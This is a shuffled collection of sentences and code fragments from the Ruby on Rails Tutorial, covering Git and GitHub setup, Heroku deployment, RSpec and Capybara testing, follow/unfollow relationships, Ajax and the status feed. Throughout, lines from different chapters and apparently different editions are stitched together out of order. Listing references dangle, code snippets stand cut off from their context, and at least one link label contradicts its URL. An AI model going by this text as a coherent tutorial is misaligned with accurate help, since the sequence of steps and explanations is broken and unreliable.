This means we can still undo the changes easily by having Git check out the previous commit with the \kode{checkout} command (and a \kode{-f} flag to force overwriting the current changes):
A user profile with a follow button (\href{http://localhost:3000/users/2}{/users/2}).~\href{http://railstutorial.org/images/figures/profile_follow_button_bootstrap-full.png}{(full size)}
The missing directory and file are back.
A user profile with an unfollow button (\href{http://localhost:3000/users/8}{/users/6}).~\href{http://railstutorial.org/images/figures/profile_unfollow_button_bootstrap-full.png}{(full size)}
Now that you've put your project under version control with Git, it's time to push your code up to \href{http://github.com}{GitHub}, a social coding site optimized for hosting and sharing Git repositories.
Pages to display followed users and followers will resemble a hybrid of the user profile page and the user index page (Section~\ref{sec:user_index}), with a sidebar of user information (including the following stats) and a list of users.
Putting a copy of your Git repository at GitHub serves two purposes: it's a full backup of your code (including the full history of commits), and it makes any future collaboration much easier.
In addition, we'll include a raster of user profile image links in the sidebar.
This step is optional, but being a GitHub member will open the door to participating in a wide variety of open-source projects.
GitHub has a variety of paid plans, but for open-source code their services are free, so sign up for a \href{https://github.com/signup/free}{free GitHub account} if you don't have one already.
A mockup of the user following page.~\href{http://railstutorial.org/images/figures/following_mockup_bootstrap-full.png}{(full size)}
(You might have to follow the \href{http://help.github.com/key-setup-redirect}{GitHub tutorial on creating SSH keys} first.)
A mockup of the user followers page.~\href{http://railstutorial.org/images/figures/followers_mockup_bootstrap-full.png}{(full size)}
(Take care \emph{not} to initialize the repository with a \kode{README} file, as \kode{rails new} creates one of those automatically.)
After submitting the form, push up your first application as follows:
in Listing~\ref{code:following_followers_authorization_test}.
These commands tell Git that you want to add GitHub as the origin for your main (\emph{master}) branch and then push your repository up to GitHub.
(Don't worry about what the \texttt{-u} flag does; if you're curious, do a web search for ``git set upstream''.)
      .
GitHub also has native applications to augment the command-line interface, so if you're more comfortable with GUI apps you might want to check out \href{http://windows.github.com/}{GitHub for Windows} or \href{http://mac.github.com/}{GitHub for Mac}.
 (GitHub for Linux is still just Git, it seems.)
Sign in
Because of the \kode{.rdoc} extension on the file, GitHub ensures that it is formatted nicely, but the contents aren't helpful at all, so in this section we'll make our first edit by changing the \kode{README} to describe our project rather than the Rails framework itself.
Test for the \kode{followed\_users} and \kode{followers} pages.
Each action needs to set a title, find the user, retrieve either \kode{@user.followed\_users} or \kode{@user.followers} (in paginated form), and then render the page.
By the way, for a change as small as this one I wouldn't normally bother with a new branch, but it's never too early to start practicing good habits.
I prefer the \href{http://daringfireball.net/projects/markdown/}{Markdown markup language} to the default RDoc for this purpose, and if you use the file extension \kode{.md} then GitHub will automatically format it nicely for you.
# Ruby on Rails Tutorial: first application
This is the first application for the
by [Michael Hartl](http://michaelhartl.com/).
Note here that both actions make an \emph{explicit} call to \kode{render}, in this case rendering a view called \kode{show\_follow}, which we must create.
Be careful about using the \kode{-a} flag improperly; if you have added any new files to the project since the last commit, you still have to tell Git about them using \kode{git add} first.
Note that we write the commit message in the \emph{present} tense.
See the GitHub post \href{https://github.com/blog/926-shiny-new-commit-styles}{Shiny new commit styles} for more information.
Showing the users being followed by the current user.~\href{http://railstutorial.org/images/figures/user_following_bootstrap-full.png}{(full size)}
Showing the current user's followers.~\href{http://railstutorial.org/images/figures/user_followers_bootstrap-full.png}{(full size)}
The tests for these buttons combine many of the testing techniques covered throughout this tutorial and make for a good exercise in reading code.
We'll cover it momentarily.)
Note in particular the use of the \kode{have\_xpath} method, which is an advanced and powerful technique that uses \href{http://en.wikipedia.org/wiki/XPath}{XPath} to navigate XML documents (including HTML5).
You can read more about XPath by doing a web search for \href{http://www.w3schools.com/xpath/xpath_syntax.asp}{XPath syntax}.
Tests for the Follow/Unfollow button.
<n>          end
Now that we've updated the \kode{README}, we can push the changes up to GitHub to see the result.
Since we have already done one push (Section~\ref{sec:github}), on most systems we can omit \kode{origin master}, and simply run \kode{git push}:
Even at this early stage, we're already going to deploy our (still-empty) Rails application to production.
Writing the implementation involves digging a little deeper: following and unfollowing involve \emph{creating} and \emph{destroying} relationships, which means defining \kode{create} and \kode{destroy} actions in a Relationships controller (which we must create).
(This is the security hole alluded to above.)
Tests for the Relationships controller authorization.
A \kode{Gemfile} with added gems and explicit Ruby version.
Note that, in order to avoid the overhead of creating a virtually useless Relationship object, the \kode{delete} test hard-codes the id~\kode{1} in the named route:
To install it, we run \kode{bundle install} with a special flag:
This works because the user should be redirected before the application ever tries to retrieve the relationship with this~id.
The controller code needed to get these tests to pass is remarkably concise: we just retrieve the user followed or to be followed, and then follow or unfollow the user using the relevant utility method.
Because the only gems we've added are restricted to a production environment, right now this command doesn't actually install any additional local gems, but it's needed to update \kode{Gemfile.lock} with the \texttt{pg} and \texttt{rails\_12factor} gems and the specific Ruby version.
The full implementation appears in Listing~\ref{code:relationships_controller}.
The first step is to \href{http://api.heroku.com/signup}{sign up for Heroku}; after checking your email to complete the creation of your account, install the necessary Heroku software using the \href{https://toolbelt.heroku.com/}{Heroku Toolbelt}
Then use the \kode{heroku} command to log in at the command line (you may have to exit and restart your terminal program first):
With that, the core follow/unfollow functionality is complete, and any user can follow (or unfollow) any other user, which you should verify both by clicking around in the sample application and by running the test suite:
In other words, a user starts on a profile page, follows the user, and is immediately redirected back to the original page.
Created http://stormy-cloud-5881.herokuapp.com/ |
git@heroku.com:stormy-cloud-5881.herokuapp.com
Because it is nominally an acronym for \emph{asynchronous JavaScript and XML}, Ajax is sometimes misspelled ``AJAX'', even though the \href{http://www.adaptivepath.com/ideas/essays/archives/000385.php}{original Ajax article} spells it as ``Ajax'' throughout.
Because the practice of adding Ajax to web forms is quite common, Rails makes Ajax easy to implement.
To deploy the application, the first step is to use Git to push it up to Heroku:
You can also use an argument to the \kode{heroku} command that automatically opens your browser with the right address:
Unfortunately, the resulting page is an error; as of Rails~4.0, for technical reasons the default Rails page doesn't work on Heroku.
The actual HTML generated by this ERb isn't particularly relevant, but you might be curious, so here's a peek:
By using a simple HTML property instead of inserting the full JavaScript code (as in previous versions of Rails), Rails~3 follows the philosophy of \href{http://railscasts.com/episodes/205-unobtrusive-javascript}{\emph{unobtrusive JavaScript}}.
in Listing~\ref{code:relationships_controller_spec_ajax}.
This uses the \kode{xhr} method (for ``XmlHttpRequest'') to issue an Ajax request; compare to the \kode{get}, \kode{post}, \kode{patch}, and \kode{delete} methods used in previous tests.
We then verify that the \kode{create} and \kode{destroy} actions do the correct things when hit with an Ajax request.
(To write more thorough test suites for Ajax-heavy applications, take a look at \href{http://seleniumhq.org/}{Selenium} and \href{http://watir.com/}{Watir}.)
Tests for the Relationships controller responses to Ajax requests.
(In fact, the \href{http://railstutorial.org}{Ruby on Rails Tutorial site} lives at Heroku; if you're reading this book online, you're looking at a Heroku-hosted site right now!)
I'm learning Ruby on Rails with @railstutorial!
All that's left is to actually start learning Rails!
Let's get to it.
In this case, though, the \kode{xhr} method is (somewhat inexplicably) not available in integration tests.
Although our use of \kode{xhr} is new, at this point in the tutorial you should be able to infer from context what the code does:
We see that \kode{xhr} takes as arguments a symbol for the relevant HTTP method, a symbol for the action, and a hash representing the contents of \kode{params} in the controller itself.
As in previous examples, we use \kode{expect} to wrap the operation in a block and test for an increment or decrement in the relevant count.
As implied by the tests, the application code uses the same \kode{create} and \kode{destroy} actions to respond to the Ajax requests that it uses to respond to ordinary \texttt{POST} and \texttt{DELETE} HTTP requests.
in Listing~\ref{code:relationships_controller_ajax}.
This code uses \kode{respond\_to} to take the appropriate action depending on the kind of request.
(There is no relationship between this \kode{respond\_to} and the \kode{respond\_to} used in the RSpec examples.)
The syntax is potentially confusing, and it's important to understand that in
only \emph{one} of the lines gets executed (based on the nature of the request).
In the case of an Ajax request, Rails automatically calls a \emph{JavaScript Embedded Ruby} (\kode{.js.erb}) file with the same name as the action, i.e., \kode{create.js.erb} or \kode{destroy.js.erb}.
As you might guess, the files allow us to mix JavaScript and Embedded Ruby to perform actions on the current page.
The jQuery library provides a large number of methods for manipulating the DOM, but here we will need only two.
Unlike plain JavaScript files, JS-ERb files also allow the use of Embedded Ruby, which we apply in the \kode{create.js.erb} file to update the follow form with the \kode{unfollow} partial (which is what should show after a successful following) and update the follower count.
This uses the \kode{escape\_javascript} function, which is needed to escape out the result when inserting HTML in a JavaScript file.
The JavaScript Embedded Ruby to create a following relationship.
With that, you should navigate to a user profile page and verify that you can follow and unfollow without a page refresh, and the test suite should also pass:
Using Ajax in Rails is a large and fast-moving subject, so we've only been able to scratch the surface here, but (as with the rest of the material in this tutorial) our treatment should give you a good foundation for more advanced resources.
To accomplish this feat, we will need some fairly advanced Rails, Ruby, and even SQL programming techniques.
A mockup of a user's Home page with a status feed.~\href{http://railstutorial.org/images/figures/page_flow_home_page_feed_mockup_bootstrap-full.png}{(full size)}
as shown in Listing~\ref{code:full_feed_specs}.
The final tests for the status feed.
We can use the above method to construct the necessary array of followed user ids by calling~\kode{id} on each element in \kode{user.followed\_users}.
At this point, you might guess that code like
Note that, because it is now raw SQL, \kode{followed\_user\_ids} is \emph{interpolated}, not escaped.
                         WHERE follower_id = :user_id"
The Home page with a working status feed.~\href{http://railstutorial.org/images/figures/home_page_with_feed_bootstrap-full.png}{(full size)}
This application includes examples of all the major features of Rails, including models, views, controllers, templates, partials, filters, validations, callbacks, \kode{has\_many}/\kode{belongs\_to} and \kode{has\_many through} associations, security, testing, and deployment.
\href{http://railstutorial.org/screencasts}{The \emph{Ruby on Rails Tutorial} screencasts}: I have prepared a full-length screencast course based on this book.
They are available for purchase through the \href{http://railstutorial.org/}{Ruby on Rails Tutorial website}.
Ruby and Rails books: I recommend \href{http://www.amazon.com/gp/product/1430223634}{\emph{Beginning Ruby}} by Peter Cooper, \href{http://www.amazon.com/gp/product/1933988657}{\emph{The Well-Grounded Rubyist}} by David~A. Black, \href{http://www.amazon.com/Eloquent-Ruby-Addison-Wesley-Professional-Series/dp/0321584104/}{\emph{Eloquent Ruby}} by Russ Olsen, and \href{http://www.amazon.com/gp/product/0672328844}{\emph{The Ruby Way}} by Hal Fulton for further Ruby learning, and \href{http://www.amazon.com/gp/product/0321601661}{\emph{The Rails~3 Way}} by Obie Fernandez and \emph{Rails~3 in Action} (wait for the second edition) by Ryan Bigg and Yehuda Katz for more about Rails.
\href{http://peepcode.com/}{PeepCode} and \href{http://codeschool.com/}{Code School}: The screencasts at PeepCode and interactive courses at Code School are consistently high-quality, and I warmly recommend them.
See the \href{http://api.rubyonrails.org/v4.2.0/classes/ActiveRecord/Callbacks.html}{Rails API entry on callbacks} for more information on which callbacks Rails supports.
For our purposes, the ``starter'' tier (which is limited to 200 emails a day but costs nothing) is the best fit.
as shown in Listing~\ref{code:generated_user_mailer_previews}.
as shown in Listing~\ref{code:account_activation_preview}.
This involves opening the \kode{Gemfile} with a text editor.
Converting the \kode{Gemfile} in Listing~\ref{code:default_gemfile} to use exact gem versions results in the code shown in Listing~\ref{code:gemfile_sqlite_version}.
Once you've placed the contents of Listing~\ref{code:gemfile_sqlite_version} into the application's \kode{Gemfile}, install the gems using \kode{bundle install}
See the \href{http://api.rubyonrails.org/v4.2.0.beta1/classes/ActiveRecord/Callbacks.html}{Rails API entry on callbacks} for more information on which callbacks Rails supports.
The raw home view (\href{http://0.0.0.0:3000/static_pages/home}{/static\_pages/home}).
The new About page (\href{http://0.0.0.0:3000/static_pages/about}{/static\_pages/about}).
in Listing~\ref{code:title_tests}.
The result is shown in Figure~\ref{fig:home_root_route}.
(In fact, as we saw in Section~\ref{sec:demo_users_resource} and Section~\ref{sec:microposts_resource}, \kode{rails generate} can make automatic edits to the \kode{routes.rb} file, which we also want to undo automatically.)
With the status feed design requirements captured in the test from Listing~\ref{code:full_feed_test}, we're ready to start writing the feed.
In Chapter~\ref{cha:user_microposts}, the result was only a proto-feed (Figure~\ref{fig:home_with_proto_feed_3rd_edition}), but with the implementation in Listing~\ref{code:from_users_followed_by_final} as seen in Figure~\ref{fig:home_page_with_feed} the Home page now shows the full feed.
Let's start exploring strings with the console, this time started with \kode{rails~c}, which is a shortcut for \kode{rails console}:
For example, if you take a look back at Figure~\ref{fig:editor_shell}, you'll see a small vertical line on the right to help keep code under 80 characters.
You're now in a position to appreciate, at least vaguely, what this code means: \kode{StaticPagesController} is a class that inherits from \kode{ApplicationController}, and comes equipped with \kode{home}, \kode{help}, and \kode{about} methods.
We see from the \kode{class} keyword in Listing~\ref{code:static_pages_controller} that \kode{static\_pages\_controller.rb} defines a \emph{class}, in this case called \kode{StaticPagesController}.
As described in Section~\ref{sec:generated_static_pages}, an action called \kode{home} is associated with a view called \kode{home.html.erb} located in the \kode{app/views/static\_pages} directory, which means that we need to create a new file called \kode{about.html.erb} in the same directory.
# Create the token.
All methods defined in a class after \kode{private} are automatically hidden, so that
in Listing~\ref{code:before_create_activation_digest}.
as shown in Listing~\ref{code:account_activation_edit_action}.
in Listing~\ref{code:add_activation_to_users_migration}.
in Listing~\ref{code:preventing_unactivated_logins}.
       else
as seen in Listing~\ref{code:log_in_password_resets} and Figure~\ref{fig:forgot_password_link}.
as shown in Listing~\ref{code:password_reset_migration}.
as shown in Listing~\ref{code:password_reset_form}.
in Listing~\ref{code:password_resets_integration_test}.
With the code as in Listing~\ref{code:password_resets_integration_test}, our test suite should be \passing:
In this case, it's easy to write a short test for the User model, in which we use \kode{following?}
as shown in Listing~\ref{code:relationships_access_control}.
as shown in Listing~\ref{code:comment_out_failing_tests}.
The user index view.
CSS for the user index.
Of course, to create enough users to make a decent user index, we \emph{could} use our web browser to visit the signup page and make the new users one by one, but far a better solution is to use Ruby (and Rake) to make the users for us.
The user index with pagination.
So, for example, page~1 is users 1--30, page~2 is users 31--60, etc. If the page is \kode{nil}, \kode{paginate} simply returns the first page.
Here the \kode{:page} parameter comes from \kode{params[:page]}, which is generated automatically by \kode{will\_paginate}.
The paginated user index is now complete, but there's one improvement I can't resist including: Rails has some incredibly slick tools for making compact views, and in this section we'll refactor the index page to use them.
The fully refactored user index.
Now that the user index is complete, there's only one canonical REST action left: \kode{destroy}.
Finally, we migrate the development database and prepare the test database:
This request would make user 17 an admin, which would be a potentially serious security breach, to say the least.
We'll start by adding a delete link for each user on the user index page, restricting access to administrative users.
If you must support non-JavaScript-enabled browsers you can fake a \texttt{DELETE} request using a form and a \texttt{POST} request, which works even without JavaScript; see the RailsCast on ``\href{http://railscasts.com/episodes/77-destroy-without-javascript}{Destroy Without JavaScript}'' for details.
as seen in Listing~\ref{code:destroy_action}.
As constructed, only admins can destroy users through the web, because only admins can see the delete links.
Unfortunately, there's still a terrible security hole: any sufficiently sophisticated attacker could simply issue \texttt{DELETE} requests directly from the command line to delete any user on the site.
If you still find this tutorial too difficult, you might try starting with \href{http://learn-rails.com/}{\emph{Learn Ruby on Rails}} by Daniel Kehoe or \href{http://mbsy.co/7Zdc7}{One Month Rails}, both of which are geared more toward complete beginners than the \emph{Ruby on Rails Tutorial}.
As we'll see starting in Section~\ref{sec:following}, our user interface won't allow this to happen, but adding a unique index arranges to raise an error if a user tries to create duplicate relationships anyway (for example, by using a command-line tool such as \texttt{curl}).
       following
With these techniques in hand, we are well-equipped to recover from the inevitable development \href{http://en.wikipedia.org/wiki/SNAFU}{snafus}.
as shown in Listing~\ref{code:installing_rails}.
Thus, we have \kode{User} instead \kode{Users}.
To implement the forwarding behavior shown in Figure~\ref{fig:login_page_protected_mockup_bootstrap}, we'll use a \emph{before filter} in the Users controller.
in Listing~\ref{code:account_activation_and_password_resets}.
from Listing~\ref{code:test_helper_log_in} to
in Listing~\ref{code:edit_update_redirect_tests}.
as shown in Listing~\ref{code:correct_user_before_filter}.
This evaluates to \kode{session[:return\_to]} unless it's \kode{nil}, in which case it evaluates to the given default URL.
The first line here pulls the user out of the database using the submitted email address.
In this case, though, such a test involves several new ideas, so for now it's best deferred to its own section (Section~\ref{sec:layout_link_tests}).
as shown in Listing~\ref{code:test_helper_sessions}.
as shown in Listing~\ref{code:add_remember_digest_to_users_generated}.
in Listing~\ref{code:remember_test}.
anything
Though it must be used with caution, the flexibility to add methods to built-in classes allows for extraordinarily natural additions to plain Ruby.
After the cookie is set, on subsequent page views we can retrieve the user with code like
as shown in Listing~\ref{code:log_in_with_remember}.
as shown in Listing~\ref{code:forget_test}.
as shown in Listing~\ref{code:user_model_forget}.
as shown in Listing~\ref{code:branch_raise}.
in Listing~\ref{code:persistent_sessions_test}.
The result appears in Listing~\ref{code:log_out_with_test_close_browser}
in Listing~\ref{code:test_close_browser}.
NoMethodError: You have a nil object when you didn't expect it!
You might have expected an instance of Array.
The error occurred while evaluating nil.empty?
=> ["User"]
We'll then complete user login in Section~\ref{sec:login_success} by adding the necessary session-manipulation code.
Then we'll lay the foundation for successful login (Section~\ref{sec:login_success}) by evaluating each login submission based on the validity of its email/password combination.
in Listing~\ref{code:nested_hashes}.
Next, we need a test to capture the sequence shown in Figure~\ref{fig:failed_login_flash_3rd_edition} and Figure~\ref{fig:flash_persistence_3rd_edition}.
With the \kode{create} action defined in Listing~\ref{code:log_in_success}, the login form defined in Listing~\ref{code:login_form_tag} should now be working.
The result appears in Listing~\ref{code:test_helper_digest}
With the \kode{digest} method from Listing~\ref{code:test_helper_digest}, we are now ready to create a user fixture for a valid user, as shown in Listing~\ref{code:real_user_fixture}.
from Listing~\ref{code:a_test_for_valid_submission} to
The result appears in Listing~\ref{code:login_after_signup_test}
   x = x + 1
   x += 1
   $ rails console
   >> x = 1
   => 1
   >> x += 1
   => 2
   >> x *= 3
   => 6
   => -1
   => nil
   x    =   x   +   1
     x     +=   1
   >> 1.year.from_now
   >> 10.weeks.ago
   >> 1.kilobyte
   => 1024
   >> 5.megabytes
   => 5242880
Throughout the rest of this chapter, you might find it helpful to consult the \href{http://ruby-doc.org/core-2.0/}{Ruby API}. It's packed (perhaps even \emph{too} packed) with information; for example, to learn more about Ruby strings you can look at the Ruby API entry for the \kode{String} class.
As discussed in more depth in Section~\ref{sec:comments_for_various_readers}, web development is a challenging subject, especially for complete beginners.
Thanks to reader \href{https://twitter.com/colmtuite}{Colm Tuite} for his excellent work in helping to convert the sample application over to Bootstrap.
We'll end by taking a first important step toward letting users sign up to our site.
(\emph{Note:} it's not (yet) very gratifying.)
In the \kode{div} tag, the \kode{hero-unit} CSS class has a special meaning to Bootstrap, as do the \kode{btn}, \kode{btn-large}, and \kode{btn-primary} classes in the signup button.
    by Michael Hartl
One of the most notable additions in recent versions of Rails is the asset pipeline, which significantly improves the production and management of static assets such as CSS, JavaScript, and images.
This section gives a high-level overview of the asset pipeline and then shows how to use a remarkable tool for making CSS called \emph{Sass}, now included by default as part of the asset pipeline.
<n> * This is a manifest file that'll automatically include all the stylesheets
<n> * available in this directory and any sub-directories.
<n> * application-wide styles to this file and they'll appear at the top of the
<n> * compiled file, but it's generally better to create a new file per style
<n> * scope.
While convenient for the programmer, this is inefficient in production; including multiple full-sized files can significantly slow page-load times (one of the most important factors affecting the quality of the user experience).
With the asset pipeline, in production all the application stylesheets get rolled into one CSS file (\kode{application.css}), all the application JavaScript code gets rolled into one JavaScript file (\kode{javascripts.js}), and all such files (including those in \kode{lib/assets} and \kode{vendor/assets}) are \emph{minified} to remove the unnecessary whitespace that bloats file size.
As a result, we get the best of both worlds: multiple nicely formatted files for programmer convenience, with single optimized files in production.
We'll implement all but the last one by the end of this chapter.
(We'll make the last one in Chapter~\ref{cha:sign_in_sign_out}.)
/signin
as shown in Listing~\ref{code:comment_out_footer}.
<n>  Contact Ruby on Rails Tutorial about the sample app at the
Now make sure that the tests pass:
In other words, we change
and so on for the other pages.
The result appears in Listing~\ref{code:route_tests}
Tests for the named routes.
As usual, you should check that the tests are now red:
Adding a mapping for the root route.
The successor to \emph{Webrat}, Capybara is named after the world's \href{http://en.wikipedia.org/wiki/Capybara}{largest rodent}.
"Help"
You may have noticed that our tests for the layout links test the routing but don't actually check that the links on the layout go to the right pages.
as shown in Listing~\ref{code:full_title_helper_tests}.
(You will have to create both the \kode{spec/helpers} directory and the \kode{application\_helper\_spec.rb} file.)
in Listing~\ref{code:rspec_utilities_simplified}.
Verify by running the test suite that the new code is still valid.
(Thanks to \href{http://alexchaffee.com/}{Alex Chaffee} for the suggestion and code used in this exercise.)
Replacing the \kode{full\_title} test helper with a simple \kode{include}.
In this section we'll make use of the latest features of RSpec to make our tests more compact and elegant.
Let's take a look at a couple of the examples to see how they can be improved:
One thing we notice is that all three examples include a visit to the root path.
We can eliminate this duplication with a \kode{before} block:
This uses the line
to visit the root path before each example.
(The \kode{before} method can also be invoked with \kode{before(:each)}, which is a synonym.)
Another source of duplication appears in each example; we have both
In addition, both examples reference the \kode{page} variable.
We can eliminate these sources of duplication by telling RSpec that \kode{page} is the \emph{subject} of the tests using
and then using a variant of the \kode{it} method to collapse the code and description into one line:
Applying these changes gives much more compact tests for the Home page:
This code looks nicer, but the title test is still a bit long.
A file for RSpec utilities with a \kode{full\_title} function.
Files in the \kode{spec/support} directory are automatically included by RSpec, which means that we can write the Home tests as follows:
We can now simplify the tests for the Help, About, and Contact pages using the same methods used for the Home page.
The results appear in Listing~\ref{code:pretty_page_tests}.
Prettier tests for the static pages.
We will use this more compact style whenever possible when developing the rest of the sample application.
The rest of the book is dedicated to fleshing out the sample application: first, by adding users who can sign up, sign in, and sign out; next, by adding user microposts; and, finally, by adding the ability to follow other users.
You can also push up to GitHub:
Finally, you can deploy to Heroku:
Using an RSpec shared example to eliminate test duplication.
"Home"
In this chapter, we will begin developing the sample application that will serve as our example throughout the rest of this tutorial.
Finally, RSpec tests will recur throughout the tutorial, so if you get stuck now I recommend forging ahead; you'll be amazed how, after just a few more chapters, initially inscrutable code will suddenly look simple.
(You might also consider the \href{http://mbsy.co/6VQ8l}{RSpec course at Code School}, which one reader has said answered a lot of his RSpec questions.)
On the other hand, for the sample application we'll also need two gems we didn't need before: the gem for RSpec and the gem for the RSpec library specific to Rails.
in Listing~\ref{code:gemfile_rspec}.
This includes \texttt{rspec-rails} in a development environment so that we have access to RSpec-specific generators, and it includes it in test mode in order to run the tests.
We don't have to install RSpec itself because it is a dependency of \texttt{rspec-rails} and will thus be installed automatically.
We also include the \href{https://github.com/jnicklas/capybara}{Capybara gem}, which allows us to simulate a user's interaction with the sample application using a natural English-like syntax, together with \href{http://docs.seleniumhq.org/projects/webdriver/}{Selenium}, one of Capybara's dependencies
Heroku recommends against using different databases in development and production, but for the sample application it won't make any difference, and SQLite is \emph{much} easier than PostgreSQL to install and configure.
Instead, we can write simply \kode{bundle install} and production gems will be ignored automatically
Dynamically generating a secret token.
# Your secret key is used for verifying the integrity of signed cookies.
# If you change this key, all old signed cookies will become invalid!
# Make sure the secret is at least 30 characters and all random,
# no regular words or you'll be exposed to dictionary attacks.
# You can use `rake secret` to generate a secure secret key.
# Make sure your secret_key_base is kept private
# if you're sharing your code publicly.
# Use the existing token.
# Generate a new token and store it in token_file.
Next, we need to configure Rails to use RSpec in place of \kode{Test::Unit}.
This can be accomplished with \kode{rails generate rspec:install}:
from Listing~\ref{code:gitignore} to
Since we'll be using this sample app throughout the rest of the book, it's a good idea to \href{https://github.com/new}{make a new repository at GitHub} and push it up:
Of course, we can optionally deploy the app to Heroku even at this early stage:
As you proceed through the rest of the book, I recommend pushing and deploying the application regularly:
This provides remote backups and lets you catch any production errors as soon as possible.
With all the preparation finished, we're finally ready to get started developing the sample application.
In this section, we'll take a first step toward making dynamic pages by creating a set of Rails \emph{actions} and \emph{views} containing (for now) only static HTML
The optimal method really depends on your needs; if you expect a \emph{large} number of static pages, using a StaticPages controller can get quite cumbersome, but in our sample app we'll only need a few.
In order to get our bearings, it's helpful to recall the Rails directory structure from Section~\ref{sec:the_first_application} (Figure~\ref{fig:directory_structure_rails}).
It's useful to be able to open the entire Rails project in your text editor or IDE. Unfortunately, how to do this is system-dependent, but in many cases you can open the current application directory, represented in Unix by a dot~``\kode{.}'', using the command-line command for your editor of choice:
<n>  $ cd ~/rails_projects/sample_app
<n>  $ <editor name> .
For example, to open the sample app in Sublime Text, you type
<n>  $ subl .
For Vim, you type
If you're using Git for version control, you should run the following command:
Rails comes with a script for making controllers called \kode{generate}; all it needs to work its magic is the controller's name.
Since we'll be making a controller to handle static pages, we'll call it the StaticPages controller.
We'll also plan to make actions for a Home page, a Help page, and an About page.
Generating a StaticPages controller.
$ rails generate controller StaticPages home help --no-test-framework
       route  get "static_pages/help"
       route  get "static_pages/home"
One common scenario is wanting to undo code generation---for example, if you change your mind on the name of a controller.
Undoing the generation means removing not only the principal generated file, but all the ancillary files as well.
(In fact, we also want to undo any automatic edits made to the \texttt{routes.rb} file.)
In Rails, this can be accomplished with \texttt{rails destroy}.
<n>  $ rails generate controller FooBars baz quux
<n>  $ rails destroy  controller FooBars baz quux
<n>  $ rails generate model Foo bar:string baz:integer
<n>  $ rails destroy model Foo
Another technique related to models involves undoing \emph{migrations}, which we saw briefly in Chapter~\ref{cha:a_demo_app} and will see much more of starting in Chapter~\ref{cha:modeling_users}.
Migrations change the state of the database using
<n>  $ rake db:migrate
<n>  $ rake db:rollback
<n>  $ rake db:migrate VERSION=0
The \kode{config} directory is where Rails collects files needed for the application configuration (hence the name).
as seen in Listing~\ref{code:pages_routes}.
The routes for the \kode{home} and \kode{help} actions in the StaticPages controller.
These refer to operations between a \emph{client} computer (typically running a web browser such as Firefox or Safari) and a \emph{server} (typically running a web server such as Apache or Nginx).
An emphasis on HTTP verbs is typical of web frameworks (including Rails) influenced by the \emph{REST architecture}, which we saw briefly in Chapter~\ref{cha:a_demo_app} and will start learning about more in Chapter~\ref{cha:sign_up}.
\texttt{GET} is the most common HTTP operation, used for \emph{reading} data on the web; it just means ``get a page'', and every time you visit a site like google.com or wikipedia.org your browser is submitting a \texttt{GET} request. \texttt{POST} is the next most common operation; it is the request sent by your browser when you submit a form.
In Rails applications, \texttt{POST} requests are typically used for \emph{creating} things (although HTTP also allows \texttt{POST} to perform updates); for example, the \texttt{POST} request sent when you submit a registration form creates a new user on the remote site.
By the way, previous versions of Rails used \texttt{PUT} in place of \texttt{PATCH}, and Rails~4.0 still supports this usage, but \texttt{PATCH} \href{http://weblog.rubyonrails.org/2012/2/25/edge-rails-patch-is-the-new-primary-http-method-for-updates/}{matches the intended HTTP usage better} and is preferred for new applications.
This is normal for a collection of static pages---the REST architecture isn't the best solution to every problem.
The angle bracket~\kode{<} indicates that \kode{StaticPagesController} \emph{inherits} from the Rails class \kode{ApplicationController}; as we'll see momentarily, this means that our pages come equipped with a large amount of Rails-specific functionality.
In the case of the StaticPages controller, both its methods are initially empty:
Both of these views are just placeholders: they have a top-level heading (inside the \kode{h1} tag) and a paragraph (\kode{p} tag) with the full path to the relevant file.
Then we'll add a very small amount of dynamic content by changing the title on a per-page basis.
Before moving on, if you're using Git it's a good idea to add the files for the StaticPages controller to the repository:
The \emph{Rails Tutorial} takes an intuitive approach to testing that emphasizes the behavior of the application rather than its precise implementation, a variant of test-driven development (TDD) known as behavior-driven development (BDD).
Integration tests, known as \emph{request specs} in the context of RSpec, allow us to simulate the actions of a user interacting with our application using a web browser.
Together with the natural-language syntax provided by Capybara, integration tests provide a powerful method to test our application's functionality without having to manually check each page with a browser.
The defining quality of TDD is writing tests \emph{first}, before the application code.
Initially, this might take some getting used to, but the benefits are significant.
By writing a \emph{failing} test first and then implementing the application code to get it to pass, we increase our confidence that the test is actually covering the functionality we think it is.
Moreover, the fail-implement-pass development cycle induces a \href{http://en.wikipedia.org/wiki/Flow_(psychology)}{flow state}, leading to enjoyable coding and high productivity.
Finally, the tests act as a \emph{client} for the application code, often leading to more elegant software designs.
It's important to understand that TDD is not always the right tool for the job: there's no reason to dogmatically insist that tests always should be written first, that they should cover every single feature, or that there should necessarily be any tests at all.
For example, when you aren't at all sure how to solve a given programming problem, it's often useful to skip the tests and write only application code, just to get a sense of what the solution will look like.
(In the language of \href{http://en.wikipedia.org/wiki/Extreme_Programming}{Extreme Programming (XP)}, this exploratory step is called a \emph{spike}.)
Once you see the general shape of the solution, you can then use TDD to implement a more polished version.
In this section, we'll be running the tests using the \kode{rspec} command supplied by the RSpec gem.
In test-driven development, we first write a \emph{failing} test, represented in many testing tools by the color red.
We then implement code to get the test to pass, represented by the color green.
Finally, if necessary, we refactor the code, changing its form (by eliminating duplication, for example) without changing its function.
This cycle is known as ``Red, Green, Refactor''.
We'll begin by adding some content to the Home page using test-driven development, including a top-level heading (\kode{<h1>}) with the content \kode{Sample App}. The first step is to generate an integration test (request spec) for our static pages:
      invoke  rspec
      create    spec/requests/static_pages_spec.rb
This creates the \kode{static\_pages\_spec.rb} in the \kode{spec/requests} directory.
and replace it with
Code to test the contents of the Home page.
This is because RSpec uses the general malleability of Ruby to define a \emph{domain-specific language} (DSL) built just for testing.
The important point is that \emph{you do not need to understand RSpec's syntax to be able to use RSpec}. It may seem like magic at first, but RSpec and Capybara are designed to read more or less like English, and if you follow the examples in this tutorial you'll pick it up fairly quickly.
The first line indicates that we are describing the Home page.
This description is just a string, and it can be anything you want; RSpec doesn't care, but you and other human readers probably do.
Then the spec says that when you visit the Home page at \kode{/static\_pages/home}, the content should contain the words ``Sample App''.
As with the first line, what goes inside the quote marks is irrelevant to RSpec, and is intended to be descriptive to human readers.
Then the line
uses the Capybara function \kode{visit} to simulate visiting the URL \kode{/static\_pages/home} in a browser, while the line
uses the \kode{page} variable (also provided by Capybara) to express the expectation that the resulting page should have the right content.
as shown in Listing~\ref{code:capybara_dsl}.
(In the full third edition of the \emph{Rails Tutorial}, I plan to eliminate this requirement by adopting the newer technique of \href{https://www.relishapp.com/rspec/rspec-rails/docs/feature-specs/feature-spec}{feature specs}.)
Adding the Capybara DSL to the RSpec helper file.
# This file is copied to spec/ when you run 'rails generate rspec:install'
For now, we'll use the \kode{rspec} command at the command line (executed with \kode{bundle exec} to ensure that RSpec runs in the environment specified by our \kode{Gemfile})
